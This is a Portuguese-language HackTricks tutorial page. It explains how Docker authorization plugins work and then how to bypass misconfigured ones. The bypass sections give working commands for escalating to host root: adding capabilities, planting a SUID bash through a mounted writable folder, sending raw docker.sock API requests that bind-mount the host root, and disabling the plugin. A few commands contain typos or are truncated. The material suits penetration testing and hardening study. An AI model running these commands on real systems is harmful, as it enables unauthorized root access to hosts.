<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>


O modelo de **autorização** padrão do **Docker** é **tudo ou nada**. Qualquer usuário com permissão para acessar o daemon do Docker pode **executar qualquer** comando do cliente **Docker**. O mesmo vale para os chamadores que usam a API do Engine do Docker para entrar em contato com o daemon. Se você precisar de um **maior controle de acesso**, você pode criar **plugins de autorização** e adicioná-los à configuração do seu daemon do Docker. Usando um plugin de autorização, um administrador do Docker pode **configurar políticas de acesso granulares** para gerenciar o acesso ao daemon do Docker.

# Arquitetura básica

Os plugins de autenticação do Docker são **plugins externos** que você pode usar para **permitir/negar** **ações** solicitadas ao Daemon do Docker **dependendo** do **usuário** que a solicitou e da **ação** **solicitada**.

**[As seguintes informações são dos documentos](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Quando uma **solicitação HTTP** é feita ao daemon do Docker através da CLI ou via API do Engine, o **subsistema de autenticação** **passa** a solicitação para o(s) **plugin(s) de autenticação** instalado(s). A solicitação contém o usuário (chamador) e o contexto do comando. O **plugin** é responsável por decidir se **permite** ou **nega** a solicitação.

Os diagramas de sequência abaixo representam um fluxo de autorização permitido e negado:

![Fluxo de Autorização Permitido](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Fluxo de Autorização Negado](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Cada solicitação enviada ao plugin **inclui o usuário autenticado, os cabeçalhos HTTP e o corpo da solicitação/resposta**. Apenas o **nome de usuário** e o **método de autenticação** usado são passados para o plugin. Mais importante, **nenhuma** credencial de usuário **ou tokens são passados**. Por fim, **nem todos os corpos de solicitação/resposta são enviados** para o plugin de autorização. Apenas aqueles corpos de solicitação/resposta em que o `Content-Type` é `text/*` ou `application/json` são enviados.

Para comandos que podem potencialmente sequestrar a conexão HTTP (`HTTP Upgrade`), como `exec`, o plugin de autorização é chamado apenas para as solicitações HTTP iniciais. Uma vez que o plugin aprova o comando, a autorização não é aplicada ao restante do fluxo. Especificamente, os dados de streaming não são passados para os plugins de autorização. Para comandos que retornam uma resposta HTTP segmentada, como `logs` e `events`, apenas a solicitação HTTP é enviada aos plugins de autorização.

Durante o processamento de solicitações/respostas, alguns fluxos de autorização podem precisar fazer consultas adicionais ao daemon do Docker. Para completar tais fluxos, os plugins podem chamar a API do daemon de forma semelhante a um usuário regular. Para habilitar essas consultas adicionais, o plugin deve fornecer os meios para um administrador configurar políticas de autenticação e segurança adequadas.

## Vários Plugins

Você é responsável por **registrar** seu **plugin** como parte da **inicialização** do daemon do Docker. Você pode instalar **múltiplos plugins e encadeá-los**. Esta cadeia pode ser ordenada. Cada solicitação ao daemon passa em ordem pela cadeia. Somente quando **todos os plugins concedem acesso** ao recurso, o acesso é concedido.

# Exemplos de Plugins

## Twistlock AuthZ Broker

O plugin [**authz**](https://github.com/twistlock/authz) permite que você crie um simples arquivo **JSON** que o **plugin** estará **lendo** para autorizar as solicitações. Portanto, ele lhe dá a oportunidade de controlar de forma muito fácil quais endpoints da API cada usuário pode alcançar.

Este é um exemplo que permitirá que Alice e Bob criem novos containers: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Na página [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) você pode encontrar a relação entre a URL solicitada e a ação. Na página [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) você pode encontrar a relação entre o nome da ação e a ação

## Tutorial de Plugin Simples

Você pode encontrar um **plugin fácil de entender** com informações detalhadas sobre instalação e depuração aqui: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Leia o `README` e o código `plugin.go` para entender como ele funciona.

# Bypass de Plugin de Autenticação do Docker

## Enumerar acesso

As principais coisas a verificar são **quais endpoints são permitidos** e **quais valores de HostConfig são permitidos**.

Para realizar essa enumeração, você pode **usar a ferramenta** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## `run --privileged` não permitido

### Privilégios Mínimos
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Executando um contêiner e depois obtendo uma sessão privilegiada

Neste caso, o sysadmin **proibiu que os usuários montem volumes e executem contêineres com a flag `--privileged` ou concedam qualquer capacidade extra ao contêiner:**
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
No entanto, um usuário pode **criar um shell dentro do contêiner em execução e conceder a ele privilégios extras**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Agora, o usuário pode escapar do contêiner usando qualquer uma das [**técnicas discutidas anteriormente**](./#privileged-flag) e **aumentar os privilégios** dentro do host.

## Montar Pasta Gravável

Neste caso, o sysadmin **proibiu os usuários de executar contêineres com a flag `--privileged`** ou conceder qualquer capacidade extra ao contêiner, e ele apenas permitiu montar a pasta `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Note que talvez você não consiga montar a pasta `/tmp`, mas pode montar uma **pasta diferente gravável**. Você pode encontrar diretórios graváveis usando: `find / -writable -type d 2>/dev/null`

**Observe que nem todos os diretórios em uma máquina Linux suportarão o bit suid!** Para verificar quais diretórios suportam o bit suid, execute `mount | grep -v "nosuid"`. Por exemplo, geralmente `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` e `/var/lib/lxcfs` não suportam o bit suid.

Observe também que se você puder **montar `/etc`** ou qualquer outra pasta **contendo arquivos de configuração**, você pode alterá-los a partir do contêiner docker como root para **abusá-los no host** e escalar privilégios (talvez modificando `/etc/shadow`).
{% endhint %}

## Ponto de Extremidade da API Não Verificado

A responsabilidade do sysadmin ao configurar este plugin seria controlar quais ações e com quais privilégios cada usuário pode executar. Portanto, se o administrador adotar uma abordagem de **lista negra** com os pontos de extremidade e os atributos, ele pode **esquecer alguns deles** que poderiam permitir a um atacante **escalar privilégios**.

Você pode verificar a API do docker em [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Estrutura JSON Não Verificada

### Vinculações na raiz

É possível que, ao configurar o firewall do docker, o sysadmin tenha **esquecido de algum parâmetro importante** da [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Vinculações**".\
No exemplo a seguir, é possível abusar dessa má configuração para criar e executar um contêiner que monta a pasta raiz (/) do host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Observe como neste exemplo estamos usando o parâmetro **`Binds`** como uma chave de nível raiz no JSON, mas na API ele aparece sob a chave **`HostConfig`**
{% endhint %}

### Binds em HostConfig

Siga a mesma instrução como com **Binds em raiz** realizando esta **requisição** para a API do Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montagens na raiz

Siga as mesmas instruções como com **Vínculos na raiz** realizando esta **solicitação** para a API do Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Montagens em HostConfig

Siga as mesmas instruções como com **Vínculos em root** realizando esta **solicitação** para a API do Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Atributo JSON não verificado

É possível que, ao configurar o firewall do docker, o sysadmin **tenha esquecido de algum atributo importante de um parâmetro** da [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Capabilities**" dentro de "**HostConfig**". No exemplo a seguir, é possível abusar dessa configuração incorreta para criar e executar um contêiner com a capacidade **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
O **`HostConfig`** é a chave que geralmente contém os **privilégios** **interessantes** para escapar do contêiner. No entanto, como discutimos anteriormente, observe como o uso de Vínculos fora dele também funciona e pode permitir que você contorne as restrições.
{% endhint %}

## Desabilitando o Plugin

Se o **sysadmin** **esqueceu** de **proibir** a capacidade de **desabilitar** o **plugin**, você pode aproveitar isso para desativá-lo completamente!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Lembre-se de **reativar o plugin após a escalada**, ou um **reinício do serviço do docker não funcionará**!

## Writeups de Bypass do Plugin de Autorização

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# Referências

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
